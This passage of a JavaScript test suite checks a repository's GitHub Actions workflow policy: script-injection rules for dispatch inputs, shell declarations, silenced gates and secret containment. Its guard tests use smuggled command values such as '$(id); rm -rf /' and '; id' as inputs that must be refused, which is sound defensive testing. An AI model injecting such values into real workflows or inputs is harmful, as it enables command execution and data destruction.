    assert.equal(workflows.has(unwrittenWorkflow), false);
    workflows.set(unwrittenWorkflow, unwrittenDispatchWorkflow({
      run: 'echo "${{ inputs.ref }}"\n',
    }));
    assert.deepEqual(dispatchInputInterpolationViolations(workflows), [
      `${unwrittenWorkflow} jobs.leak.steps.0 (Echo the dispatched ref)`
        + " must read ${{ inputs.ref }} from step env, not interpolated script text:"
        + " it carries a dispatch input",
    ]);
    assert.match(
      validateWorkflows(workflows).join("\n"),
      /future-dispatch-proof\.yml jobs\.leak\.steps\.0 \(Echo the dispatched ref\) must read/u,
    );
  });

  await t.test("the same unwritten workflow reading that value from env is not a violation", () => {
    const workflows = loadWorkflows();
    workflows.set(unwrittenWorkflow, unwrittenDispatchWorkflow({
      env: { INPUT_REF: "${{ inputs.ref }}" },
      run: 'echo "$INPUT_REF"\n',
    }));
    assert.deepEqual(dispatchInputInterpolationViolations(workflows), []);
  });

  // GitHub serves one dispatched value under several spellings and an expression can bury the
  // context inside a function call. A rule that only knows `inputs.name` exempts the rest.
  for (const [name, expression] of [
    ["the short spelling", "${{ inputs.version }}"],
    ["the spelling GitHub serves the same value under", "${{ github.event.inputs.version }}"],
    ["the index spelling", "${{ inputs['version'] }}"],
    ["a fallback that reaches an input second", "${{ github.ref_name || inputs.version }}"],
    // Braces inside the expression must not end the match early and hide the rest of it. The first
    // case carries a single `}`, which the old non-greedy match survived. The rest carry `}}`
    // sequences -- `{{` and `}}` are GitHub's own documented escapes for a literal brace inside
    // `format()` -- and those it did not: `${{ format('{{Hello {0}}}', inputs.ref) }}` was cut to
    // `${{ format('{{Hello {0}}`, which names no context, so the rule reported the file clean while
    // GitHub spliced the input. Every one of these passed policy and actionlint before the fix.
    ["a spelling wrapped in a format call carrying a brace", "${{ format('{0}', inputs.version) }}"],
    ["the documented format brace escape", "${{ format('{{Hello {0}}}', inputs.version) }}"],
    ["the documented escape around two placeholders",
      "${{ format('{{Hello {0} {1}}}', inputs.version, github.sha) }}"],
    ["a brace escape whose literal looks like the terminator", "${{ format('}}{{', inputs.version) }}"],
    ["JSON carrying a nested object", `\${{ fromJSON('{"a":{"b":1}}').a.b && inputs.version }}`],
  ]) {
    await t.test(`${name} is refused`, () => {
      const workflows = loadWorkflows();
      workflows.set(unwrittenWorkflow, unwrittenDispatchWorkflow({ run: `echo "${expression}"\n` }));
      assert.deepEqual(dispatchInputInterpolationViolations(workflows), [
        `${unwrittenWorkflow} jobs.leak.steps.0 (Echo the dispatched ref)`
          + ` must read ${expression} from step env, not interpolated script text:`
          + " it carries a dispatch input",
      ]);
      // Reporting is not enough on its own: the span has to be the whole expression. A matcher that
      // stops early still names `inputs` in some of these and would pass the check above on an
      // accident rather than on the property being claimed.
      assert.deepEqual(interpolationSpans(`echo "${expression}"`), [expression]);
    });
  }

  // Naming the `inputs` context alone reads the value's *location*, not the value. One hop moves
  // it somewhere the rule was not looking, and the launder is a legal, actionlint-clean workflow.
  // Each of these passed both gates before the channels were refused with the context.
  //
  // These replace two cases that used to assert `${{ steps.*.outputs.* }}` and
  // `${{ needs.*.outputs.* }}` are "not a violation". That claim was false, and asserting it meant
  // a test was holding the hole open: it would have failed anyone who tried to close it.
  await t.test("a job-level env binding does not launder an input into script text", () => {
    const workflows = loadWorkflows();
    workflows.set(unwrittenWorkflow, unwrittenDispatchWorkflow(
      { run: 'echo "${{ env.LAUNDERED }}"\n' },
      { env: { LAUNDERED: "${{ inputs.ref }}" } },
    ));
    assert.deepEqual(dispatchInputInterpolationViolations(workflows), [
      `${unwrittenWorkflow} jobs.leak.steps.0 (Echo the dispatched ref)`
        + " must read ${{ env.LAUNDERED }} from step env, not interpolated script text:"
        + " it carries env",
    ]);
    assert.match(validateWorkflows(workflows).join("\n"), /must read \$\{\{ env\.LAUNDERED \}\}/u);
  });

  // For `workflow_dispatch`, `github.event` is the container the inputs arrive in, so serialising
  // it carries every dispatched value into script text without the word `inputs` appearing at all.
  // `toJSON` is not an escape: it preserves `$(` and backticks verbatim.
  await t.test("serialising the event payload does not launder an input into script text", () => {
    const workflows = loadWorkflows();
    workflows.set(unwrittenWorkflow, unwrittenDispatchWorkflow(
      { run: 'echo "${{ toJSON(github.event) }}"\n' },
    ));
    assert.deepEqual(dispatchInputInterpolationViolations(workflows), [
      `${unwrittenWorkflow} jobs.leak.steps.0 (Echo the dispatched ref)`
        + " must read ${{ toJSON(github.event) }} from step env, not interpolated script text:"
        + " it carries the event payload",
    ]);
    assert.match(validateWorkflows(workflows).join("\n"), /it carries the event payload/u);
  });

  await t.test("a step output does not launder an input into a later script", () => {
    const workflows = loadWorkflows();
    workflows.set(unwrittenWorkflow, unwrittenDispatchWorkflow(
      { run: 'echo "${{ steps.launder.outputs.ref }}"\n' },
      {
        steps: [{
          name: "Write the dispatched ref to a step output",
          id: "launder",
          shell: "bash",
          env: { INPUT_REF: "${{ inputs.ref }}" },
          run: 'echo "ref=$INPUT_REF" >> "$GITHUB_OUTPUT"\n',
        }],
      },
    ));
    assert.deepEqual(dispatchInputInterpolationViolations(workflows), [
      `${unwrittenWorkflow} jobs.leak.steps.1 (Echo the dispatched ref)`
        + " must read ${{ steps.launder.outputs.ref }} from step env, not interpolated script text:"
        + " it carries a step output",
    ]);
  });

  await t.test("a job output does not launder an input into another job's script", () => {
    const workflows = loadWorkflows();
    workflows.set(unwrittenWorkflow, unwrittenDispatchWorkflow(
      { run: 'echo "${{ needs.resolve.outputs.ref }}"\n' },
    ));
    assert.deepEqual(dispatchInputInterpolationViolations(workflows), [
      `${unwrittenWorkflow} jobs.leak.steps.0 (Echo the dispatched ref)`
        + " must read ${{ needs.resolve.outputs.ref }} from step env, not interpolated script text:"
        + " it carries a job output",
    ]);
  });

  // Over-firing would make the rule unusable and force exemptions, which is how the per-file shape
  // started. These are the expressions a run: body is still allowed to carry, and each remedy above
  // is one `env:` line -- for `env` itself it is zero, because a workflow- or job-level `env:` entry
  // is already exported into the shell.
  for (const [name, run] of [
    ["a workflow context", 'echo "${{ github.run_attempt }}"\n'],
    ["a matrix value", 'echo "${{ matrix.asset_target }}"\n'],
    ["a runner context", 'echo "${{ runner.os }}"\n'],
    ["a shell variable whose name merely contains the word", 'echo "$RELEASE_INPUTS_PATH"\n'],
    ["the shell read of a job-level env entry", 'echo "$LAUNDERED"\n'],
    ["a shell variable that merely spells the env context", 'echo "$env_path/bin"\n'],
    // `_` is a word character, so `\bevent\b` does not reach inside `github.event_name`. Reading
    // which trigger fired says nothing about what was dispatched.
    ["the trigger name, which is not the event payload", 'echo "${{ github.event_name }}"\n'],
  ]) {
    await t.test(`${name} is not a violation`, () => {
      const workflows = loadWorkflows();
      workflows.set(unwrittenWorkflow, unwrittenDispatchWorkflow(
        { run },
        { env: { LAUNDERED: "${{ inputs.ref }}" } },
      ));
      assert.deepEqual(dispatchInputInterpolationViolations(workflows), []);
    });
  }

  // #1554 established that a checkout `ref:` is not an executable surface: it is resolved by the
  // action, not parsed by a shell, and it is pinned separately where it belongs. This rule reads
  // `run:` only, and that boundary is asserted rather than assumed.
  await t.test("a dispatch input in an action input is outside this rule's surface", () => {
    const workflows = loadWorkflows();
    workflows.set(unwrittenWorkflow, {
      name: "Future dispatch proof",
      on: { workflow_dispatch: { inputs: { ref: { required: true, type: "string" } } } },
      permissions: { contents: "read" },
      jobs: {
        leak: {
          "runs-on": "ubuntu-latest",
          "timeout-minutes": 10,
          steps: [{
            name: "Checkout the dispatched ref",
            uses: "actions/checkout@v5",
            with: { ref: "${{ inputs.ref }}" },
          }],
        },
      },
    });
    assert.deepEqual(dispatchInputInterpolationViolations(workflows), []);
  });
});

// Moving a value out of the script's text and into `env:` moves the read out of GitHub's
// interpolator and into the shell -- and the shell is not the same everywhere. `${{ env.NAME }}`
// read identically on every runner; `"$NAME"` is a bash read, and this repository's packaged build
// matrix includes windows-latest, where the runner default is pwsh and the read is `$env:NAME`.
// The failure mode is the dangerous one: not an error, but a proof comparing against an empty
// string. Closing #1566's laundering channels forced these reads into scripts, so the property the
// rewrite depends on is asserted rather than assumed.
test("a binding consumed as a shell variable must say which shell it was written for", async (t) => {
  await t.test("the repository as it stands declares a shell wherever it matters", () => {
    assert.deepEqual(shellDependentBindingViolations(loadWorkflows()), []);
  });

  // Every step the #1566 rewrite pointed at a variable, on the one job whose matrix reaches
  // Windows. Dropping the shell is the whole mutation; the script text is untouched.
  for (const name of [
    "Install pinned Rust",
    "Smoke packaged release asset",
    "Prove Linux x64 glibc 2.31 baseline",
    "Report fresh package identity",
  ]) {
    await t.test(`${name} cannot leave its shell to the runner`, () => {
      const workflows = loadWorkflows();
      delete draftStep(workflows.get("packaged-platform-proof.yml").jobs.build, name).shell;
      assert.match(
        shellDependentBindingViolations(workflows).join("\n"),
        new RegExp(`\\(${name}\\) reads [A-Z_, ]+ as a shell variable`, "u"),
      );
      assert.match(validateWorkflows(workflows).join("\n"), /must declare its shell/u);
    });
  }

  // The Windows smoke is the counter-case: it consumes the same two bindings and is correct
  // because it reads them the way its own shell spells them.
  await t.test("the Windows smoke reads the same bindings the pwsh way", () => {
    const step = draftStep(loadWorkflows().get("packaged-platform-proof.yml").jobs.build,
      "Smoke packaged release asset on Windows");
    assert.equal(step.shell, "pwsh");
    assert.equal(step.env.SOURCE_SHA, "${{ steps.source-identity.outputs.sha }}");
    assert.match(step.run, /--expected-source-sha "\$env:SOURCE_SHA"/u);
    assert.equal(/--expected-source-sha "\$SOURCE_SHA"/u.test(step.run), false);
  });

  // A job pinned to a non-Windows label needs no declaration: bash is the runner default there,
  // and requiring one would be noise rather than a property.
  await t.test("a Linux-only job is not asked to declare a shell it already has", () => {
    const workflows = loadWorkflows();
    const job = workflows.get("release.yml").jobs["marketplace-publish"];
    assert.equal(job["runs-on"], "ubuntu-latest");
    assert.equal(draftStep(job, "Point the catalog at the published release").shell, undefined);
    assert.deepEqual(shellDependentBindingViolations(workflows), []);
  });
});

// A rule is only as blocking as the step that runs it. `continue-on-error` lives outside the
// script, so nothing this file's own text asserts can see it, and it converts every `exit 1` the
// step produces into advice. The commands the policy gate runs were pinned; that the gate FAILS was
// not, so one key on plugin-static.yml would have silenced this file and its whole suite green.
//
// The repository has scripts that deliberately absorb their own failure, so "gates must be
// blocking" would be false here. What those have and a silenced gate does not is a successor: an
// `id:`, and a later step that reads `steps.<id>.outcome` and fails on it. That is the property.
test("a script that absorbs its own failure must hand that failure to something that does not", async (t) => {
  await t.test("the repository as it stands absorbs no failure into nothing", () => {
    assert.deepEqual(absorbedFailureViolations(loadWorkflows()), []);
    assert.deepEqual(validateWorkflows(loadWorkflows()), []);
  });

  // The exact key the reviewer reached for, on the exact step. It silences check-workflow-policy.mjs
  // AND `node --test check-workflow-policy.test.mjs` at once while the job still reports success.
  await t.test("the workflow policy gate cannot be made advisory", () => {
    const workflows = loadWorkflows();
    draftStep(workflows.get("plugin-static.yml").jobs["plugin-static"], "Check workflow policy")
      ["continue-on-error"] = true;
    assert.deepEqual(absorbedFailureViolations(workflows), [
      "plugin-static.yml jobs.plugin-static.steps.7 (Check workflow policy) absorbs its own"
        + " failure and must have an id whose outcome a later blocking step requires",
    ]);
    assert.match(validateWorkflows(workflows).join("\n"), /Check workflow policy\) absorbs its own failure/u);
  });

  // The rule names no step and no file: it reads whatever `run:` steps exist, so a gate added
  // tomorrow is covered the day it lands. Every gate step in the repository is mutated here.
  for (const [file, workflow] of loadWorkflows()) {
    for (const [jobId, job] of Object.entries(workflow.jobs ?? {})) {
      const steps = (Array.isArray(job?.steps) ? job.steps : [])
        .map((step, index) => ({ step, index }))
        .filter(({ step }) => typeof step?.run === "string"
          && step["continue-on-error"] === undefined);
      if (steps.length === 0) continue;
      const { step, index } = steps[0];
      await t.test(`${file} ${jobId} cannot silence ${step.name ?? `step ${index}`}`, () => {
        const workflows = loadWorkflows();
        workflows.get(file).jobs[jobId].steps[index]["continue-on-error"] = true;
        const reported = absorbedFailureViolations(workflows);
        // Silencing a step that was somebody else's successor reports both -- the step that stopped
        // failing and the step whose failure it stopped requiring -- so this asserts the mutated
        // step is named rather than that it is the only one named.
        assert.equal(
          reported.some(violation => violation.startsWith(`${file} jobs.${jobId}.steps.${index} `)
            || violation.startsWith(`${file} jobs.${jobId}.steps.${index} (`)),
          true,
          reported.join("\n"),
        );
      });
    }
  }

  // An `id:` on its own is not a successor. Naming the step is how you make its outcome readable,
  // not how you make it required, and stopping at the id would let one line reopen the hole.
  await t.test("naming the silenced step is not enough", () => {
    const workflows = loadWorkflows();
    const gate = draftStep(workflows.get("plugin-static.yml").jobs["plugin-static"], "Check workflow policy");
    gate["continue-on-error"] = true;
    gate.id = "workflow-policy";
    assert.match(
      absorbedFailureViolations(workflows).join("\n"),
      /must have an id whose outcome a later blocking step requires/u,
    );
  });

  // And the shape that is allowed: the failure is absorbed here and required there.
  await t.test("a successor that requires the outcome makes absorbing it legal", () => {
    const workflows = loadWorkflows();
    const job = workflows.get("plugin-static.yml").jobs["plugin-static"];
    const gate = draftStep(job, "Check workflow policy");
    gate["continue-on-error"] = true;
    gate.id = "workflow-policy";
    job.steps.push({
      name: "Require the workflow policy gate",
      shell: "bash",
      env: { POLICY_OUTCOME: "${{ steps.workflow-policy.outcome }}" },
      run: 'test "$POLICY_OUTCOME" = success\n',
    });
    assert.deepEqual(absorbedFailureViolations(workflows), []);
  });

  // The precedent this generalises must survive it. The optional cache restores are `uses:` steps
  // whose miss is the normal path: they carry no outcome for anything to require, and a separate
  // rule requires them to stay non-blocking. Generalising must not put those two in conflict.
  for (const [file, jobId, name] of [
    ["rust-ci.yml", "linux-draft", "Restore Cargo inputs and output"],
    ["rust-ci.yml", "linux-draft", "Restore compiler objects"],
    ["source-proof.yml", "full-source-gate", "Restore Cargo dependency inputs"],
    ["packaged-platform-proof.yml", "build", "Restore Cargo dependency inputs"],
  ]) {
    await t.test(`${file} ${name} stays deliberately optional`, () => {
      const workflows = loadWorkflows();
      const step = draftStep(workflows.get(file).jobs[jobId], name);
      assert.equal(step["continue-on-error"], true);
      assert.equal(step.run, undefined);
      assert.deepEqual(absorbedFailureViolations(workflows), []);
      assert.deepEqual(validateWorkflows(workflows), []);
    });
  }

  // The two scripts that legitimately absorb their failure, and what happens when the successor
  // that requires them is taken away. Without this the rule could be satisfied by deleting the
  // requirement instead of the `continue-on-error`.
  for (const [file, jobId, absorbing, successor] of [
    ["source-proof.yml", "full-source-gate", "Compile the complete workspace test suite",
      "Require successful source compilation"],
    ["source-proof.yml", "full-source-gate", "Lint every workspace target and feature once",
      "Require successful source compilation"],
  ]) {
    await t.test(`${file} ${absorbing} stops being required when ${successor} drops it`, () => {
      const workflows = loadWorkflows();
      const job = workflows.get(file).jobs[jobId];
      const id = draftStep(job, absorbing).id;
      const step = draftStep(job, successor);
      step.env = Object.fromEntries(
        Object.entries(step.env ?? {}).filter(([, value]) => !String(value).includes(`steps.${id}.outcome`)),
      );
      assert.match(
        absorbedFailureViolations(workflows).join("\n"),
        new RegExp(`\\(${absorbing}\\) absorbs its own failure`, "u"),
      );
    });
  }

  // A job-level key downgrades every step it contains at once, so no per-step id can answer for it.
  // Only a downstream job reading `needs.<id>.result` can.
  await t.test("a job cannot absorb its own failure into nothing either", () => {
    const workflows = loadWorkflows();
    workflows.get("plugin-static.yml").jobs["plugin-static"]["continue-on-error"] = true;
    assert.deepEqual(absorbedFailureViolations(workflows), [
      "plugin-static.yml jobs.plugin-static absorbs its own failure and must have"
        + " needs.plugin-static.result required",
    ]);
  });
});

// Routing a dispatched value through `env:` removes it from the script's text -- and from the
// reach of the fragment pin that used to name it there. `--expected-sha "$INPUT_REF"` reads the
// same whether `INPUT_REF` carries `inputs.ref` or a commit nobody reviewed, so the pin now has
// two halves: the script names the variable, and the variable names the value. Both halves are
// proven here for the trust-anchoring steps -- the release-cell producers, whose `--expected-sha`
// is the commit every downstream claim is filed against -- and for the mode guards that decide
// which claims a protected run is allowed to make at all.
test("env-routed dispatch inputs stay pinned to the value they were reviewed with", async (t) => {
  assert.deepEqual(validateWorkflows(loadWorkflows()), []);
  const reviewedRef = "${{ inputs.ref }}";
  const behaviorOnly = "${{ inputs.server_behavior_only }}";
  const sites = [
    ["linux-vulkan-proof.yml", "packaged-vulkan", "Validate candidate-installed mode",
      { SERVER_BEHAVIOR_ONLY: behaviorOnly },
      'test "$SERVER_BEHAVIOR_ONLY" = true', `test "${behaviorOnly}" = true`],
    ["windows-vulkan-proof.yml", "packaged-vulkan", "Validate candidate-installed mode",
      { SERVER_BEHAVIOR_ONLY: behaviorOnly },
      'if ($env:SERVER_BEHAVIOR_ONLY -ne "true")', `if ("${behaviorOnly}" -ne "true")`],
    ["macos-metal-proof.yml", "packaged-metal", "Validate candidate-installed mode",
      { SERVER_BEHAVIOR_ONLY: behaviorOnly, CALIBRATION_MODE: "${{ inputs.calibration_mode }}" },
      'test "$SERVER_BEHAVIOR_ONLY" = true', `test "${behaviorOnly}" = true`],
    ["linux-vulkan-proof.yml", "packaged-vulkan", "Emit authenticated Linux Vulkan release cells",
      { INPUT_REF: reviewedRef },
      '--expected-sha "$INPUT_REF"', `--expected-sha "${reviewedRef}"`],
    ["windows-vulkan-proof.yml", "packaged-vulkan", "Emit authenticated Vulkan release cell",
      { INPUT_REF: reviewedRef },
      '--expected-sha "$INPUT_REF"', `--expected-sha "${reviewedRef}"`],
    ["windows-vulkan-proof.yml", "packaged-vulkan", "Emit authenticated Windows retrieval-readiness release cell",
      { INPUT_REF: reviewedRef },
      '--expected-sha "$INPUT_REF"', `--expected-sha "${reviewedRef}"`],
    ["windows-vulkan-proof.yml", "packaged-vulkan", "Emit authenticated candidate-installed Windows release cell",
      { INPUT_REF: reviewedRef },
      '--expected-sha "$INPUT_REF"', `--expected-sha "${reviewedRef}"`],
    ["macos-metal-proof.yml", "packaged-metal", "Emit authenticated Metal release cell",
      { INPUT_REF: reviewedRef },
      '--expected-sha "$INPUT_REF"', `--expected-sha "${reviewedRef}"`],
    ["macos-metal-proof.yml", "packaged-metal", "Emit authenticated macOS retrieval-readiness release cell",
      { INPUT_REF: reviewedRef },
      '--expected-sha "$INPUT_REF"', `--expected-sha "${reviewedRef}"`],
    ["macos-metal-proof.yml", "packaged-metal", "Emit authenticated candidate-installed macOS release cell",
      { INPUT_REF: reviewedRef },
      '--expected-sha "$INPUT_REF"', `--expected-sha "${reviewedRef}"`],
    ["packaged-platform-proof.yml", "build", "Emit authenticated package release cell",
      { INPUT_REF: reviewedRef },
      '--expected-sha "$INPUT_REF"', `--expected-sha "${reviewedRef}"`],
    // source-proof resolves its own trusted head in an earlier job rather than taking a dispatched
    // ref, so its anchor is that job's output. Same two halves, different source of truth.
    ["source-proof.yml", "full-source-gate", "Emit authenticated source release cell",
      { RESOLVED_REF: "${{ needs.resolve.outputs.ref }}" },
      '--expected-sha "$RESOLVED_REF"', '--expected-sha "${{ needs.resolve.outputs.ref }}"'],
  ];
  for (const [file, jobId, stepName, bindings, needle, splice] of sites) {
    for (const [key, expected] of Object.entries(bindings)) {
      await t.test(`${file} ${stepName} refuses a rewired ${key}`, () => {
        const workflows = loadWorkflows();
        draftStep(workflows.get(file).jobs[jobId], stepName).env[key] = "${{ github.event.pull_request.head.sha }}";
        const violations = validateWorkflows(workflows);
        assert.ok(
          violations.includes(`${file} step ${stepName} must bind ${key} to ${expected}`),
          violations.join("\n"),
        );
      });
      await t.test(`${file} ${stepName} refuses a dropped ${key}`, () => {
        const workflows = loadWorkflows();
        delete draftStep(workflows.get(file).jobs[jobId], stepName).env[key];
        assert.ok(
          validateWorkflows(workflows)
            .includes(`${file} step ${stepName} must bind ${key} to ${expected}`),
        );
      });
    }
    await t.test(`${file} ${stepName} refuses the splice it was rewritten away from`, () => {
      const workflows = loadWorkflows();
      const step = draftStep(workflows.get(file).jobs[jobId], stepName);
      assert.equal(step.run.includes(needle), true, `missing pinned fragment ${needle}`);
      step.run = step.run.replace(needle, splice);
      const violations = validateWorkflows(workflows);
      // Both layers must see it: the fragment pin, which knows what this step should read, and
      // the generic rule, which knows nothing about this step and refuses the shape anyway.
      assert.ok(
        violations.includes(`${file} step ${stepName} must run ${needle}`),
        violations.join("\n"),
      );
      if (splice.includes("inputs")) {
        assert.ok(
          violations.some(violation =>
            violation.startsWith(`${file} jobs.${jobId}.steps.`)
            && violation.includes("from step env, not interpolated script text")),
          violations.join("\n"),
        );
      }
    });
  }
});

// The guard is the layer the workflow relies on before a ref is resolved or a token is minted, so
// it is proven by running it rather than by reading it. Every refusal below reaches the guard's own
// `::error::` and exit 1: a bash syntax error would also be non-zero and would prove nothing.
test("the marketplace dispatch guard refuses whole values, not first lines", async (t) => {
  const commit = "0123456789abcdef0123456789abcdef01234567";
  const version = "0.16.3";
  const refused = [
    // grep anchors per line, so each of these presents one well-formed line and smuggles the rest.
    ["a commit whose first line is a valid abbreviated sha", {
      INPUT_COMMIT: "abc1234\n$(id); rm -rf /",
      INPUT_VERSION: version,
    }],
    ["a commit whose payload precedes the sha", { INPUT_COMMIT: "; id\nabc1234", INPUT_VERSION: version }],
    ["a version whose first line is a release", { INPUT_COMMIT: commit, INPUT_VERSION: "0.16.3\n; id" }],
    ["a version whose payload precedes the release", { INPUT_COMMIT: commit, INPUT_VERSION: "; id\n0.16.3" }],
    ["a commit carrying a command substitution", { INPUT_COMMIT: "abc1234$(id)", INPUT_VERSION: version }],
    ["a version carrying a trailing command", { INPUT_COMMIT: commit, INPUT_VERSION: "0.16.3; id" }],
    ["a commit shorter than an abbreviation", { INPUT_COMMIT: "abc123", INPUT_VERSION: version }],
    ["a commit longer than a sha", { INPUT_COMMIT: `${commit}ab`, INPUT_VERSION: version }],
    ["a non-hexadecimal commit", { INPUT_COMMIT: "zzzzzzz", INPUT_VERSION: version }],
    ["an empty commit", { INPUT_COMMIT: "", INPUT_VERSION: version }],
    ["an empty version", { INPUT_COMMIT: commit, INPUT_VERSION: "" }],
    ["a v-prefixed version", { INPUT_COMMIT: commit, INPUT_VERSION: "v0.16.3" }],
  ];
  for (const [name, environment] of refused) {
    await t.test(`refuses ${name}`, () => {
      const result = runMarketplaceGuard(environment);
      assert.equal(result.status, 1, `guard admitted ${JSON.stringify(environment)}`);
      assert.match(result.stdout, /::error::/u);
    });
  }
  const admitted = [
    ["an abbreviated sha", { INPUT_COMMIT: "abc1234", INPUT_VERSION: version }],
    ["a full sha", { INPUT_COMMIT: commit, INPUT_VERSION: "1.0.0" }],
    ["a prerelease version", { INPUT_COMMIT: commit, INPUT_VERSION: "0.16.3-rc.1" }],
    ["an uppercase sha", { INPUT_COMMIT: "ABC1234DEF", INPUT_VERSION: version }],
  ];
  for (const [name, environment] of admitted) {
    await t.test(`admits ${name}`, () => {
      const result = runMarketplaceGuard(environment);
      assert.equal(result.status, 0, result.stderr);
    });
  }
  await t.test("every refusal above was measured under the shell the step declares", () => {
    assert.equal(marketplaceGuardStep().shell, "bash");
    assert.equal(runMarketplaceGuard({ INPUT_COMMIT: "abc1234", INPUT_VERSION: version }).shell, "bash");
  });
});

// `shell:` is invisible to both the fragment assertions and the script digest -- neither reads a
// key outside `run:` -- so the guard's dependence on bash was a blind spot on both sides. This
// measures that dependence rather than arguing it: the identical script, under a shell that lacks
// `[[`, never reaches its own refusal. That is why the shell is pinned in policy, and why the
// harness above resolves the declared key instead of hardcoding bash.
test("the dispatch guard's refusal is bash-dependent, so the declared shell is load-bearing", async (t) => {
  const payload = { INPUT_COMMIT: "abc1234$(id); rm -rf /", INPUT_VERSION: "0.16.3" };
  const step = marketplaceGuardStep();

  await t.test("bash refuses the payload", () => {
    const result = spawnMarketplaceGuard("bash", step.run, payload);
    assert.equal(result.status, 1, `bash admitted ${JSON.stringify(payload)}`);
    assert.match(result.stdout, /::error::commit must be/u);
  });

  // The harness reads the step's declared shell rather than assuming one, so a workflow that
  // changed its shell would change what this suite executes instead of silently measuring bash.
  await t.test("the harness follows the declared shell and refuses to guess", () => {
    assert.equal(marketplaceGuardShell({ shell: "bash" }), "bash");
    assert.equal(marketplaceGuardShell({ shell: "sh" }), "sh");
    assert.throws(() => marketplaceGuardShell({}), /must declare its shell/u);
    assert.throws(() => marketplaceGuardShell({ shell: "pwsh" }), /cannot run/u);
  });

  const posix = posixShellWithoutDoubleBracket();
  await t.test("a POSIX shell never reaches the refusal", { skip: posix === undefined
    ? "no POSIX shell without [[ is available on this host"
    : false }, () => {
    const result = spawnMarketplaceGuard(posix, step.run, payload);
    // On dash `[[` is a missing command; inside an `if` condition `set -e` does not fire, so the
    // reject branch is skipped and the script runs off its end with status 0. Older dash instead
    // dies on `set -o pipefail`. Either way the refusal the guard exists to perform never happens.
    assert.doesNotMatch(
      result.stdout,
      /::error::commit must be/u,
      `${posix} unexpectedly performed the guard's refusal`,
    );
  });

  await t.test("policy refuses to let the step run under that shell", () => {
    const workflows = loadWorkflows();
    draftStep(workflows.get("marketplace-sync.yml").jobs.sync, marketplaceGuardName).shell = "sh";
    assert.match(
      validateWorkflows(workflows).join("\n"),
      /marketplace-sync\.yml jobs\.sync\.steps\.0 must declare shell: bash/u,
    );
  });

  await t.test("policy refuses an inherited shell", () => {
    const workflows = loadWorkflows();
    delete draftStep(workflows.get("marketplace-sync.yml").jobs.sync, marketplaceGuardName).shell;
    assert.match(
      validateWorkflows(workflows).join("\n"),
      /marketplace-sync\.yml jobs\.sync\.steps\.0 must declare shell: bash/u,
    );
  });

  await t.test("the pin covers every run step in the file, not only the guard", () => {
    const workflows = loadWorkflows();
    draftStep(
      workflows.get("marketplace-sync.yml").jobs.sync,
      "Point the catalog at the published release",
    ).shell = "sh";
    assert.match(
      validateWorkflows(workflows).join("\n"),
      /marketplace-sync\.yml jobs\.sync\.steps\.4 must declare shell: bash/u,
    );
  });
});

test("the plugin lane publishes the catalog it then smoke-installs", async (t) => {
  assert.deepEqual(validateWorkflows(loadWorkflows()), []);
  const file = "plugin-release.yml";
  const smokeStep = workflow =>
    draftStep(workflow.jobs["post-publish-smoke"], "Prove the public marketplace install path");
  const tokenStep = workflow =>
    draftStep(workflow.jobs["marketplace-publish"], "Mint a scoped marketplace token");
  const catalogStep = workflow =>
    draftStep(workflow.jobs["marketplace-publish"], "Point the catalog at the published release");
  const mutations = [
    ["smoke installs the revision preflight saw before publication", workflow => {
      workflow.jobs.preflight.outputs.marketplace_revision
        = "${{ steps.marketplace.outputs.marketplace_revision }}";
      smokeStep(workflow).env.MARKETPLACE_REVISION
        = "${{ needs.preflight.outputs.marketplace_revision }}";
    }, /post-publish smoke must install from the marketplace revision this release published/u],
    ["preflight resurrects a pre-publication revision", workflow => {
      workflow.jobs.preflight.outputs.marketplace_revision
        = "${{ steps.marketplace.outputs.marketplace_revision }}";
    }, /preflight must not capture a marketplace revision that predates publication/u],
    ["catalog publication is dropped from the lane", workflow => {
      delete workflow.jobs["marketplace-publish"];
      workflow.jobs["post-publish-smoke"].needs = ["preflight", "publish"];
    }, /must keep exactly the plugin lane the release claim graph declares/u],
    ["smoke stops waiting on catalog publication", workflow => {
      workflow.jobs["post-publish-smoke"].needs = ["preflight", "publish"];
    }, /post-publish-smoke dependencies must match the release claim graph/u],
    ["catalog publication races the release it advertises", workflow => {
      workflow.jobs["marketplace-publish"].needs = ["preflight"];
    }, /marketplace-publish dependencies must match the release claim graph/u],
    ["catalog publication loses its credential environment", workflow => {
      delete workflow.jobs["marketplace-publish"].environment;
    }, /marketplace publication must hold its cross-repository credential in its own environment/u],
    ["the marketplace token is unpinned", workflow => {
      tokenStep(workflow).uses = "actions/create-github-app-token@v1";
    }, /marketplace token must be a SHA-pinned app token scoped to the marketplace repository/u],
    ["the marketplace token widens beyond the catalog repository", workflow => {
      tokenStep(workflow).with.repositories = "CodeStory";
    }, /marketplace token must be a SHA-pinned app token scoped to the marketplace repository/u],
    ["the catalog is pointed at an unbound version", workflow => {
      const step = catalogStep(workflow);
      step.run = step.run.replace('--version "$INPUT_VERSION"', '--version "$LATEST"');
    }, /Point the catalog at the published release must run --version/u],
    // Routing the version through `env:` moves it out of the script's text, so the script's own
    // fragment can no longer see which value it carries. Rebinding the variable is the same
    // substitution the mutation above makes, one layer down.
    ["the catalog's version variable is rebound to another value", workflow => {
      catalogStep(workflow).env.INPUT_VERSION = "${{ github.ref_name }}";
    }, /Point the catalog at the published release must bind INPUT_VERSION/u],
    ["catalog publication hides the delivery state it recorded", workflow => {
      delete workflow.jobs["marketplace-publish"].outputs;
    }, /marketplace publication must publish the recorded delivery state/u],
  ];
  for (const [name, mutate, expected] of mutations) {
    await t.test(name, () => {
      const workflows = loadWorkflows();
      mutate(workflows.get(file));
      const violations = validateWorkflows(workflows);
      assert.notDeepEqual(violations, []);
      assert.match(violations.join("\n"), expected);
    });
  }
});

// The lane's advertised security property is that it receives and forwards no secrets, and the
// marketplace token step is the single sanctioned exception. `secrets.NAME` is only one of the
// ways a GitHub expression reaches that context, so a suite that only mutates the dot form proves
// nothing: every shape below is valid GitHub and must trip the rule, or the exemption is a hole.
test("the plugin lane's secret containment holds for every way of naming the context", async (t) => {
  assert.deepEqual(validateWorkflows(loadWorkflows()), []);
  const file = "plugin-release.yml";
  const forbidden = /must not receive or forward secrets beyond the minted marketplace app identity/u;
  const marketplaceJob = workflow => workflow.jobs["marketplace-publish"];
  const smokeStep = workflow =>
    draftStep(workflow.jobs["post-publish-smoke"], "Prove the public marketplace install path");
  const tokenStep = workflow => draftStep(marketplaceJob(workflow), "Mint a scoped marketplace token");
  const catalogStep = workflow =>
    draftStep(marketplaceJob(workflow), "Point the catalog at the published release");
  const mutations = [
    ["a secret leaks outside the token step", workflow => {
      catalogStep(workflow).env.APP_ID = "${{ secrets.MARKETPLACE_APP_ID }}";
    }],
    ["the lane opens a callable secret surface", workflow => {
